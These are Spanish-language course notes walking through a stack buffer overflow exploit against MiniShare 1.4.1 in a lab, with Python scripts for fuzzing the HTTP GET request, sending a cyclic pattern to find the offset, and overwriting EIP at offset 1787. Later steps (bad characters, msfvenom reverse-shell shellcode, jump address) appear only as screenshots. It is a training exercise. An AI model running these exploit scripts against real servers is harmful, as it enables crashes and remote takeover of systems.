- Tags : #buffer_overflow 

Con el objetivo de reforzar todo lo aprendido hasta ahora en esta sección, en esta clase vamos a intentar explotar otro Buffer Overflow. El procedimiento que aplicaremos será el mismo, aunque la fase inicial y la forma de entablar las conexiones en Python cambiarán un poco.

A continuación, se os comparte el enlace de descarga al software vulnerable que estaremos ejecutando:

- **MiniShare**: [https://es.osdn.net/projects/sfnet_minishare/downloads/OldFiles/minishare-1.4.1.exe/](https://es.osdn.net/projects/sfnet_minishare/downloads/OldFiles/minishare-1.4.1.exe/)

Este caso es similar al anterior con la diferencia de que la conexión por telnet se hará de otra manera ya que es un recurso web por lo que generamos otro script. Este nos probara de 100 en 100 hasta lograr corromper el programa 

```python

#!/usr/bin/python3

from struct import pack
import socket, sys

# Variables globales
ip_address = "192.168.111.46"
port = 80

def exploit():

    total_length = 100

    while True:

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(7)

            s.connect((ip_address, port))

            print("\n[+] Enviando %d bytes" % total_length)

            s.send(b"GET " + b"\x41"*total_length + b" HTTP/1.1\r\n\r\n")
            s.recv(1024)
            s.close()

            total_length += 100

        except:
            print("\n[!] El servicio al parecer se ha corrompido\n")
            print("\n[i] El servicio ha crasheado con un total de %d bytes enviados" % total_length)
            sys.exit(1)

if __name__ == '__main__':

    exploit()
```

Previamente seguiremos los pasos del caso anterior don de determinamos en que punto es donde se sobrecarga el buffer generando la cadena aleatoria con msfvenom y determinando el offset 
![](../../../attachments/Pasted%20image%2020260225083937.png)

Modificamos el script

```python

#!/usr/bin/python3

from struct import pack
import socket, sys

# Variables globales
ip_address = "192.168.111.46"
port = 80
payload = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9'

def exploit():

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(7)

        s.connect((ip_address, port))

        s.send(b"GET " + payload + b" HTTP/1.1\r\n\r\n")
        s.recv(1024)
        s.close()

        total_length += 100

    except:
        print("\n[!] El servicio al parecer se ha corrompido\n")
        sys.exit(1)

if __name__ == '__main__':

    exploit()
```

Verificamos el offset con *msfvenom* , como referencia ver siempre el ejemplo anterior en este paso , debemos copiar el valor del *EIP* en Immunity para hacer la comparación del offset 

![](../../../attachments/Pasted%20image%2020260225084625.png)

Vovemos a modificar para ver si tenemos el control del EIP

```python

#!/usr/bin/python3

from struct import pack
import socket, sys

# Variables globales
ip_address = "192.168.111.46"
port = 80

offset=1787
before_eip=b'A'*offset
eip = b'B'*4
payload = before_eip + eip
def exploit():

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(7)

        s.connect((ip_address, port))

        s.send(b"GET " + payload + b" HTTP/1.1\r\n\r\n")
        s.recv(1024)
        s.close()

        total_length += 100

    except:
        print("\n[!] El servicio al parecer se ha corrompido\n")
        sys.exit(1)

if __name__ == '__main__':

    exploit()
```

Verificado esto le agregamos un conjunto de C para ver donde la posiciona seria agregar al payload 
![](../../../Pasted%20image%2020260225085030.png)

Ahora haremos la identificacion de los byearray para identificar que caracteres no admite el programa, referencia el ejercicio anterior

Modificamos el script para en vez de las C ponerle los badchars e ir descartando , referencia de como se hace en el ejercicio anterior
![](../../../attachments/Pasted%20image%2020260225085328.png)

Una vez identificado los caracteres que no puede contener , pasamos a generar el shellcode con msfvenom

![](../../../attachments/Pasted%20image%2020260225085629.png)

Modificamos nuestro script para introducir el shellcode y ejecutar la reverse shell

![](../../../attachments/Pasted%20image%2020260225085907.png)

Debemos Buscar la direccion a donde el eip debe apuntar que lo hariamos 
![](../../../attachments/Pasted%20image%2020260225090043.png)

Buscamos el binario que esta disponible sea binario dll lo que sea que tenga el eip jum habilitado
![](../../../attachments/Pasted%20image%2020260225090305.png)
Si no encuentra nada como es el caso pues utilizamos otra utilidad

![](../../../attachments/Pasted%20image%2020260225090635.png)

Modificamos el script para que el *eip* apunte a la dirección obtenida

![](../../../attachments/Pasted%20image%2020260225090807.png)

Nos lanzamos el script y debemos obtener la reverse shell

![](../../../attachments/Pasted%20image%2020260225090912.png)